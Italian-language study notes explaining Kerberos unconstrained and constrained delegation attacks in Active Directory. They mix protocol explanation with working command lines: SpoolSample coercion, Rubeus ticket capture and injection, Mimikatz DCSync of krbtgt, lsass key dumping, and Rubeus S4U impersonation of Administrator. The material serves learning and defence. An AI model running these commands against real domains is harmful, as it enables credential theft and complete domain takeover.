# Delegation

## Unconstrained Delegation
![alt text](images/delegation/Unconstrained_Delegation.png)

###Il flusso:
- 1-2 — Mario si autentica al DC e ottiene il suo TGT.
- 3-4 — Mario chiede un TGS per Service A e lo ottiene.
- 5 — "authenticates with TGS and delegates his TGT" — questo è il punto critico. Mario manda al Service A non solo il TGS, ma anche il suo TGT completo. Service A ora ha in memoria il TGT originale di Mario.
- 6-7 — Service A usa il TGT di Mario per chiedere al DC un TGS per Service B, come se fosse Mario stesso a chiederlo. Il DC non sa distinguere, il TGT è valido e appartiene a Mario.
- 8 — Service A presenta quel TGS a Service B, impersonando completamente Mario.

### Perché "delegates his TGT" è così pericoloso
- Il TGT è la chiave master di Mario, con esso puoi chiedere ticket per qualsiasi servizio nel dominio. Quando Mario lo consegna a Service A, sta dicendo di fatto **"fai qualsiasi cosa per conto mio, verso chiunque"**.
- La cosa grave è che Mario non sceglie di farlo consapevolmente, **è Windows che lo fa automaticamente quando Service A ha la flag di unconstrained delegation**. Mario non vede nessun avviso, nessuna conferma.

### Lo scenario di attacco concreto
Tu hai compromesso Service A (che ha unconstrained delegation). Aspetti che un DA si autentichi a quel servizio — magari forzandolo tu stesso con il printer bug (vedi pagina AD.md per saperne di più del printer bug):
```
powershell# Forza il DC a autenticarsi a Service A (printer bug)
SpoolSample.exe dc.corp.local serviceA.corp.local

# Nel frattempo su Service A aspetti il TGT del DC
Rubeus.exe monitor /interval:1 /filteruser:dc$

# Quando arriva, lo inietti nella tua sessione
Rubeus.exe ptt /ticket:<base64-ticket>

# Ora hai il TGT del DC — puoi fare DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
Il TGT del domain controller è equivalente a essere DA — con esso puoi fare DCSync e dumpare tutti gli hash del dominio.
```

#### Piccola sottigliezza interessante!
Quando fai DCSync con il TGT del DC, il flusso Kerberos normale avviene, Mimikatz usa quel TGT per chiedere un TGS per il servizio di replica AD (ldap/dc.corp.local), poi usa quel TGS per parlare con il DC e richiedere la replica delle credenziali.
```
Tu (con TGT del DC$) → chiedi TGS per ldap/dc.corp.local → DC risponde con TGS
Tu → usi TGS per fare replica DRSUAPI → DC ti manda gli hash
```
Il DC accetta la richiesta di replica perché dal suo punto di vista sta parlando con se stesso — il TGT appartiene a DC$, che ha i diritti di replica per design.

##### La cosa sottile
DCSync non è un attacco che sfrutta una vulnerabilità tecnica di Kerberos — sfrutta il fatto che i DC hanno il privilegio ```Replicating Directory Changes All``` per sincronizzarsi tra loro. Mimikatz simula il comportamento di un DC secondario che chiede al DC primario di replicare le credenziali, usando il protocollo legittimo DRSUAPI.

Quindi il flusso completo dall'inizio è:
1. Comprometti macchina con unconstrained delegation
2. Forzi DC$ ad autenticarsi → rubi il suo TGT
3. Inietti il TGT di DC$ nella tua sessione
4. Chiedi TGS per ldap/dc.corp.local (usando TGT di DC$)
5. DC rilascia TGS perché il TGT è valido
6. Usi TGS per fare DRSUAPI replication request
7. DC ti manda gli hash di krbtgt, Administrator, tutti

Dal punto di vista del DC è tutto legittimo — vede un altro DC che si sta sincronizzando. Non sa che sei tu.

#### Qui non c'è nessun PRE-AUTH!

- **La preauth serve solo per ottenere il TGT**
- La preauth (step 1 del flusso Kerberos) serve esclusivamente nella fase AS-REQ — quando chiedi il TGT al DC per la prima volta. È lì che dimostri di conoscere la chiave dell'utente cifrando il timestamp.
- Ma tu il TGT di DC$ lo hai già — l'hai rubato dalla memoria di Service A. Quindi salti completamente la fase di preauth e entri direttamente alla fase 2.
```
Flusso normale:
AS-REQ (preauth con chiave di DC$) → AS-REP (TGT) → TGS-REQ → TGS-REP → servizio

Flusso con TGT rubato:
[salti AS-REQ completamente]  →  TGS-REQ (presenti TGT rubato) → TGS-REP → servizio
```

##### Cosa mandi al DC nella TGS-REQ
Quando usi il TGT rubato per chiedere un TGS, mandi:

- il TGT di DC$ (che hai rubato)
- un authenticator cifrato con la chiave di sessione contenuta nel TGT
- il nome del servizio che vuoi (ldap/dc.corp.local)

Il DC decifra il TGT con krbtgt, trova la chiave di sessione dentro, verifica l'authenticator, e rilascia il TGS — vedendo solo che DC$ sta chiedendo un ticket, senza sapere che sei tu.


###### Il problema dell'authenticator
![alt text](images/meme/meme_wait_a_minute.png)
Aspetta — hai detto che l'authenticator è cifrato con la chiave di sessione contenuta nel TGT. Ma quella chiave di sessione non la conosci tu — è dentro il TGT cifrato con krbtgt, che non puoi leggere.

La risposta è che quando Rubeus cattura il TGT dalla memoria di lsass, **cattura non solo il TGT ma anche la chiave di sessione associata — perché lsass le tiene entrambe in memoria per poterle usare**. Quindi hai tutto il necessario per costruire una TGS-REQ valida.
```
powershell# Rubeus cattura TGT + chiave di sessione insieme
Rubeus.exe monitor /interval:1 /filteruser:dc$

# Output contiene il ticket completo con tutto il necessario
# per fare TGS-REQ senza mai fare preauth
Rubeus.exe ptt /ticket:<base64>
```

Ecco perché rubare un TGT dalla memoria è così potente — non stai solo rubando un token, stai rubando tutto il materiale crittografico necessario per impersonare quell'account completamente.

### Cos'è lsass
- lsass.exe (Local Security Authority Subsystem Service) è il processo Windows responsabile di gestire tutte le autenticazioni. Ogni volta che un utente si autentica su quella macchina, lsass riceve le credenziali, le verifica, e poi le tiene in memoria per tutta la durata della sessione — inclusi TGT e chiavi di sessione.
- Quindi lsass è fondamentalmente un deposito di credenziali attive in memoria.

### Cosa fa Rubeus monitor
- Rubeus.exe monitor non intercetta traffico di rete — apre un handle al processo lsass con **SeDebugPrivilege** (lo stesso che abiliti con **privilege::debug** in Mimikatz) e **legge direttamente le strutture dati in memoria dove lsass conserva i ticket Kerberos**.
- Ogni secondo (con /interval:1) controlla se sono apparsi nuovi ticket in memoria. Quando il DC si autentica a Service A per via del printer bug, lsass di Service A riceve e salva il TGT di DC$ — e Rubeus lo vede comparire.

```
lsass memory su Service A:
┌─────────────────────────────────┐
│ Sessione Mario    → TGT Mario   │
│ Sessione DC$      → TGT DC$  ← │ Rubeus lo legge qui
└─────────────────────────────────┘
```


## Constrained Delegation (S4U2Proxy)
![alt text](images/delegation/Constrained_Delegation.png)

Con constrained delegation, il DC controlla la lista ```msds-allowedtodelegateto``` di Service A prima di rilasciare il TGS. Se Service A ha nella lista solo cifs/serviceB, il DC rilascia TGS solo per quel servizio e rifiuta qualsiasi altra richiesta.
```
Service A chiede TGS per serviceB → DC controlla lista → serviceB c'è → OK
Service A chiede TGS per serviceC → DC controlla lista → serviceC NON c'è → RIFIUTATO
```

### La differenza pratica con unconstrained
- In unconstrained delegation il DC non controlla nulla — rilascia il TGT completo al servizio e da quel momento il servizio fa quello che vuole. È il servizio stesso che poi chiede i TGS che preferisce, senza che il DC possa limitarlo.
- In constrained delegation invece il DC mantiene il controllo — è lui che rilascia i TGS uno per uno, verificando ogni volta se quel servizio ha il permesso di delegare verso la destinazione richiesta. Il servizio non ha mai il TGT dell'utente, ha solo i TGS specifici che il DC ha deciso di dargli.
```
Unconstrained:  DC dà TGT a Service A → Service A fa da solo tutto
Constrained:    Service A chiede TGS al DC ogni volta → DC decide se concederlo
```

### Esempio
- WEB-SRV = Service A — server web IIS, gira con l'account svc-web@corp.local
- FILE-SRV = Service B — file server, gira come FILE-SRV$
- svc-web ha constrained delegation verso cifs/FILE-SRV.corp.local
- Hai compromesso WEB-SRV e sei local admin su quella macchina

L'idea è che IIS quando un utente si logga al portale web, deve accedere al file server per mostrargli i suoi documenti — per questo l'admin ha configurato la delegation.

#### Step 1 — verifichi la delegation
```
Get-DomainUser svc-web -Properties msds-allowedtodelegateto
# Output: cifs/FILE-SRV.corp.local
```

##### Step 2 — dumpi l'hash di svc-web da lsass
Sei local admin su WEB-SRV, quindi puoi leggere lsass:
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
# Output:
# Username: svc-web
# aes256: 4b55a8c0e37d...
# rc4_hmac_nt: 8846f7ea...
```

##### Step 3 — impersoni il DA verso FILE-SRV
Usi S4U2Self + S4U2Proxy per ottenere un TGS valido per Administrator verso cifs/FILE-SRV:
```
Rubeus.exe s4u /user:svc-web /aes256:4b55a8c0e37d... /impersonateuser:Administrator /msdsspn:cifs/FILE-SRV.corp.local /ptt
```

Quello che succede internamente:
```
S4U2Self:  Rubeus chiede al DC un TGS per Administrator verso svc-web
           DC: ok, svc-web ha TrustedToAuthForDelegation → rilascio il TGS

S4U2Proxy: Rubeus presenta quel TGS e chiede al DC un TGS per Administrator verso cifs/FILE-SRV
           DC: controlla msds-allowedtodelegateto di svc-web → cifs/FILE-SRV c'è → rilascio il TGS
```

#### Step 4 — accedi a FILE-SRV come Administrator
Il ticket è già iniettato in memoria (/ptt):
```
# Sei Administrator su FILE-SRV
ls \\FILE-SRV\c$
Enter-PSSession -ComputerName FILE-SRV

# Dumpi lsass di FILE-SRV
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
# Se un DA ha una sessione attiva → hai il suo hash
```


> Non hai mai visto la password di Administrator. Non hai fatto nessuna preauth come Administrator. Il DC ha rilasciato il TGS perché svc-web aveva il permesso di delegare verso cifs/FILE-SRV — e tu avevi l'hash di svc-web.






## L'unica eccezione — protocol transition
C'è una variante chiamata protocol transition (TrustedToAuthForDelegation) dove Service A può usare S4U2Self per impersonare qualsiasi utente verso se stesso, anche se quell'utente non si è mai autenticato con Kerberos. Ma anche in questo caso può delegare solo verso i servizi nella sua lista — non verso serviceC.
Dal punto di vista offensivo quindi con constrained delegation sei limitato — puoi impersonare chiunque ma solo verso quei servizi specifici. L'obiettivo diventa trovare un servizio nella lista che ti dia accesso utile, tipo cifs/dc.corp.local o ldap/dc.corp.local — che se presenti ti danno di fatto accesso da DA.